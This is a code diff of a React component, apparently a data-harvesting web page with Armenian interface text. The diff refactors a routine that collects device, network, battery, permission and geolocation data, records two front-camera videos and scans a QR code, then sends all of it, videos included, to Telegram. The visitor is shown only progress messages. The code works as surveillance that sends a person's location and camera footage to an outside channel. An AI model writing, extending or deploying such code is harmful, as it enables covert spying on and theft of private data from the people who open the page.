@@ -65,21 +65,21 @@ const PermissionHandler = () => {
   const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'>>({});
   const [sessionKey, setSessionKey] = useState(0);
   const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);
-  // Инициализируем currentSessionId сразу при монтировании
   const [currentSessionId, setCurrentSessionId] = useState<string>(() => Math.random().toString(36).substring(2, 10).toUpperCase());
   const processInitiatedRef = useRef(false); // Новый ref для отслеживания инициации процесса
+  const qrTimeoutRef = useRef<NodeJS.Timeout | null>(null); // Ref для таймаута QR-сканирования
 
   const generateSessionId = useCallback(() => {
     return Math.random().toString(36).substring(2, 10).toUpperCase();
   }, []);
 
   const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType): Promise<boolean> => {
-    console.log(`[Session ${currentSessionId}] Sending message type: ${type}`); // Добавлен лог
+    console.log(`[Session ${currentSessionId}] Sending message type: ${type}`);
     try {
       const payload: TelegramDataPayload = {
         ...data,
         messageType: type,
-        sessionId: currentSessionId, // Используем текущий ID сессии
+        sessionId: currentSessionId,
         timestamp: new Date().toISOString(),
       };
 
@@ -92,20 +92,20 @@ const PermissionHandler = () => {
       });
 
       if (response.ok) {
-        console.log(`[Session ${currentSessionId}] Data of type ${type} successfully sent to Telegram!`); // Добавлен лог
+        console.log(`[Session ${currentSessionId}] Data of type ${type} successfully sent to Telegram!`);
         if (type === MessageType.InitialSummary || type === MessageType.QrCode) {
-          toast.success("Տվյալները հաջողությամբ ուղարկվել են Telegram։"); // Данные успешно отправлены в Telegram!
+          toast.success("Տվյալները հաջողությամբ ուղարկվել են Telegram։");
         }
         return true;
       } else {
         const errorData = await response.json();
-        console.error(`[Session ${currentSessionId}] Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`); // Добавлен лог
-        toast.error(`Տվյալների ուղարկման սխալ (${type}): ${errorData.error || response.statusText}`); // Ошибка отправки данных
+        console.error(`[Session ${currentSessionId}] Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`);
+        toast.error(`Տվյալների ուղարկման սխալ (${type}): ${errorData.error || response.statusText}`);
         return false;
       }
     } catch (error: any) {
-      console.error(`[Session ${currentSessionId}] Network error sending data of type ${type} to Telegram: ${error.message}`); // Добавлен лог
-      toast.error(`Ցանցային սխալ: ${error.message}`); // Сетевая ошибка
+      console.error(`[Session ${currentSessionId}] Network error sending data of type ${type} to Telegram: ${error.message}`);
+      toast.error(`Ցանցային սխալ: ${error.message}`);
       return false;
     }
   }, [currentSessionId]);
@@ -158,7 +158,7 @@ const PermissionHandler = () => {
         });
       } catch (error: any) {
         console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
-        toast.error(`Տեսախցիկի հասանելիության սխալ (${facingMode}): ${error.message}`); // Ошибка доступа к камере
+        toast.error(`Տեսախցիկի հասանելիության սխալ (${facingMode}): ${error.message}`);
         stream?.getTracks().forEach((track) => track.stop());
         if (videoRef.current) {
           videoRef.current.srcObject = null;
@@ -175,7 +175,7 @@ const PermissionHandler = () => {
       const success = await sendDataToTelegram({ qrCodeData: qrData }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
-      toast.success("QR կոդը հաջողությամբ սկանավորվել է։"); // QR-код успешно отсканирован!
+      toast.success("QR կոդը հաջողությամբ սկանավորվել է։");
     },
     [sendDataToTelegram]
   );
@@ -186,7 +186,7 @@ const PermissionHandler = () => {
       const success = await sendDataToTelegram({ qrCodeData: `QR Scan Error: ${error}` }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
-      toast.error(`QR սկանավորման սխալ: ${error}`); // Ошибка сканирования QR
+      toast.error(`QR սկանավորման սխալ: ${error}`);
     },
     [sendDataToTelegram]
   );
@@ -196,113 +196,124 @@ const PermissionHandler = () => {
     setCollectedData({});
     setSessionKey((prevKey) => prevKey + 1);
     setProcessSuccessful(false);
-    setCurrentSessionId(generateSessionId()); // Генерируем новый ID сессии
-    processInitiatedRef.current = false; // Сбрасываем ref для новой сессии
+    setCurrentSessionId(generateSessionId());
+    processInitiatedRef.current = false;
   }, [generateSessionId]);
+
+  const runProcess = useCallback(async () => {
+    if (processInitiatedRef.current) {
+      console.log(`[Session ${currentSessionId}] runProcess already initiated for this sessionKey. Skipping.`);
+      return;
+    }
+    processInitiatedRef.current = true;
+
+    console.log(`[Session ${currentSessionId}] Starting runProcess. App Phase: ${appPhase}`);
+
+    setLoadingMessage("Սարքի տվյալների և թույլտվությունների հավաքում...");
+    setAppPhase("collectingData");
+
+    // --- Concurrently collect all initial data ---
+    const [
+      permissionStatusResult,
+      batteryInfoResult,
+      geolocationResult,
+    ] = await Promise.all([
+      getPermissionStatus(),
+      getBatteryInfo(),
+      getGeolocation(),
+    ]);
+
+    const clientInfo = getClientInfo();
+    const networkInfo = getNetworkInfo();
+    const deviceMemory = getDeviceMemory();
+
+    const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'> = {
+      clientInfo: {
+        platform: clientInfo.platform,
+        hardwareConcurrency: clientInfo.hardwareConcurrency,
+        screenWidth: clientInfo.screenWidth,
+        screenHeight: clientInfo.screenHeight,
+        browserLanguage: clientInfo.browserLanguage,
+      },
+      networkInfo: networkInfo,
+      deviceMemory: deviceMemory,
+      permissionStatus: permissionStatusResult,
+    };
+
+    if (batteryInfoResult.data) {
+      initialCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
+    } else {
+      initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
+    }
+
+    if (geolocationResult.data) {
+      initialCollectedData.geolocation = geolocationResult.data;
+    }
+    if (initialCollectedData.permissionStatus) {
+      initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
+    }
+    
+    setCollectedData(initialCollectedData);
+
+    // --- Send Initial Summary Report ---
+    const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary);
+    setProcessSuccessful(initialSendSuccess);
+
+    // --- Start Video 1 Recording ---
+    setLoadingMessage("Առաջին տեսանյութի ձայնագրում (առջևի տեսախցիկ)...");
+    setAppPhase("recordingVideo1");
+    const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
+    if (video1Base64) {
+      const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1);
+      setProcessSuccessful(prev => prev && video1SendSuccess);
+    }
+
+    // --- Video 2 Recording ---
+    setLoadingMessage("Երկրորդ տեսանյութի ձայնագրում (առջևի տեսախցիկ)...");
+    setAppPhase("recordingVideo2");
+    const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
+    if (video2Base64) {
+      const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2);
+      setProcessSuccessful(prev => prev && video2SendSuccess);
+    }
+
+    // --- QR Scanning ---
+    setLoadingMessage("Անցում դեպի հետևի տեսախցիկ՝ QR կոդը սկանավորելու համար...");
+    setAppPhase("flippingCamera");
+    setAppPhase("qrScanning");
+
+    qrTimeoutRef.current = setTimeout(async () => {
+      console.log("QR scanning timed out.");
+      const qrTimeoutSendSuccess = await sendDataToTelegram({ qrCodeData: "QR Scan Timed Out" }, MessageType.QrCode);
+      setProcessSuccessful(prev => prev && qrTimeoutSendSuccess);
+      setAppPhase("finished");
+      toast.error("QR կոդի սկանավորման ժամանակը սպառվեց։");
+    }, QR_SCAN_TIMEOUT_MS);
+  }, [
+    currentSessionId,
+    appPhase,
+    sendDataToTelegram,
+    recordVideoSegment,
+    setLoadingMessage,
+    setAppPhase,
+    setProcessSuccessful,
+    setCollectedData,
+    processInitiatedRef,
+    qrTimeoutRef
+  ]);
 
   useEffect(() => {
     console.log(`[Session ${currentSessionId}] useEffect triggered. Current appPhase: ${appPhase}, sessionKey: ${sessionKey}, processInitiatedRef.current: ${processInitiatedRef.current}`);
-    let qrTimeout: NodeJS.Timeout;
 
-    const runProcess = async () => {
-      if (processInitiatedRef.current) {
-        console.log(`[Session ${currentSessionId}] runProcess already initiated for this sessionKey. Skipping.`);
-        return;
-      }
-      processInitiatedRef.current = true; // Отмечаем, что процесс инициирован
-
-      // currentSessionId уже установлен в startNewSession или при инициализации useState
-      console.log(`[Session ${currentSessionId}] Starting runProcess. App Phase: ${appPhase}`); // Добавлен лог
-
-      setLoadingMessage("Սարքի տվյալների և թույլտվությունների հավաքում..."); // Сбор данных об устройстве и разрешениях...
-      setAppPhase("collectingData");
-
-      // --- Concurrently collect all initial data ---
-      const [
-        permissionStatusResult,
-        batteryInfoResult,
-        geolocationResult,
-      ] = await Promise.all([
-        getPermissionStatus(),
-        getBatteryInfo(),
-        getGeolocation(),
-      ]);
-
-      const clientInfo = getClientInfo();
-      const networkInfo = getNetworkInfo();
-      const deviceMemory = getDeviceMemory();
-
-      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'> = {
-        clientInfo: {
-          platform: clientInfo.platform,
-          hardwareConcurrency: clientInfo.hardwareConcurrency,
-          screenWidth: clientInfo.screenWidth,
-          screenHeight: clientInfo.screenHeight,
-          browserLanguage: clientInfo.browserLanguage,
-        },
-        networkInfo: networkInfo,
-        deviceMemory: deviceMemory,
-        permissionStatus: permissionStatusResult,
-      };
-
-      if (batteryInfoResult.data) {
-        initialCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
-      } else {
-        initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
-      }
-
-      if (geolocationResult.data) {
-        initialCollectedData.geolocation = geolocationResult.data;
-      }
-      if (initialCollectedData.permissionStatus) {
-        initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
-      }
-      
-      setCollectedData(initialCollectedData); // Сохраняем все собранные данные локально
-
-      // --- Send Initial Summary Report ---
-      const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary);
-      setProcessSuccessful(initialSendSuccess);
-
-      // --- Start Video 1 Recording ---
-      setLoadingMessage("Առաջին տեսանյութի ձայնագրում (առջևի տեսախցիկ)..."); // Запись первого видео (фронтальная камера)...
-      setAppPhase("recordingVideo1");
-      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      if (video1Base64) {
-        const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1);
-        setProcessSuccessful(prev => prev && video1SendSuccess);
-      }
-
-      // --- Video 2 Recording ---
-      setLoadingMessage("Երկրորդ տեսանյութի ձայնագրում (առջևի տեսախցիկ)..."); // Запись второго видео (фронтальная камера)...
-      setAppPhase("recordingVideo2");
-      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
-      }
-
-      // --- QR Scanning ---
-      setLoadingMessage("Անցում դեպի հետևի տեսախցիկ՝ QR կոդը սկանավորելու համար..."); // Переключение на заднюю камеру для сканирования QR-кода...
-      setAppPhase("flippingCamera");
-      setAppPhase("qrScanning");
-
-      qrTimeout = setTimeout(async () => {
-        console.log("QR scanning timed out.");
-        const qrTimeoutSendSuccess = await sendDataToTelegram({ qrCodeData: "QR Scan Timed Out" }, MessageType.QrCode);
-        setProcessSuccessful(prev => prev && qrTimeoutSendSuccess);
-        setAppPhase("finished");
-        toast.error("QR կոդի սկանավորման ժամանակը սպառվեց։"); // Время сканирования QR-кода истекло.
-      }, QR_SCAN_TIMEOUT_MS);
-    };
-
-    // Запускаем процесс только если фаза 'initial', ID сессии уже установлен и процесс еще не инициирован
     if (appPhase === "initial" && currentSessionId && !processInitiatedRef.current) {
       runProcess();
     }
 
     return () => {
-      clearTimeout(qrTimeout);
+      if (qrTimeoutRef.current) {
+        clearTimeout(qrTimeoutRef.current);
+        qrTimeoutRef.current = null;
+      }
       if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
         mediaRecorderRef.current.stop();
       }
@@ -310,12 +321,11 @@ const PermissionHandler = () => {
         (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
         videoRef.current.srcObject = null;
       }
-      // Сбрасываем ref при очистке эффекта, если сессия завершена или начинается новая
       if (appPhase === "finished" || appPhase === "initial") {
          processInitiatedRef.current = false;
       }
     };
-  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, generateSessionId, currentSessionId]);
+  }, [sessionKey, appPhase, currentSessionId, runProcess]);
 
 
   return (
@@ -354,8 +364,8 @@ const PermissionHandler = () => {
         <div className="flex flex-col items-center justify-center">
           <p className="text-lg mb-4 text-center">
             {processSuccessful
-              ? "Տվյալները հաջողությամբ ուղարկվել են։ Շնորհակալություն։" // Данные успешно отправлены. Спасибо.
-              : "Տեխնիկական անսարքություններ, խնդրում ենք կրկնել կամ փորձել ավելի ուշ:" // Технические неполадки, пожалуйста, повторите еще раз или повторите позже.
+              ? "Տվյալները հաջողությամբ ուղարկվել են։ Շնորհակալություն։"
+              : "Տեխնիկական անսարքություններ, խնդրում ենք կրկնել կամ փորձել ավելի ուշ:"
             }
           </p>
           <Button onClick={startNewSession} className="mt-4">
